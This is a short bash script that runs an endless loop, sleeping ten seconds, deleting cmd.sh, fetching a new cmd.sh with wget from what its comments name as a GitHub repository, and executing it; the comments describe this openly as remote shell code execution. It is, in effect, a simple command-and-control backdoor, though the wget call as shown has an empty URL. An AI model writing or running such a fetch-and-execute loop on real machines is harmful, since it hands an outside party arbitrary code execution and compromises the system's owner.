#!/bin/bash

# This script will download a bash file from the git
# repository and run it. This allows for remote shell
# code execution. The script will read the cmd file
# every INTERVAL.

INTERVAL=10
GIT_PATH="https://raw.github.com/mets634/neleus/"

while true; do # endless loop
    sleep $INTERVAL # sleep
    
    rm cmd.sh # remove old cmd file
    
    wget "" # get new cmd file
    ./cmd.sh # run cmd file
done
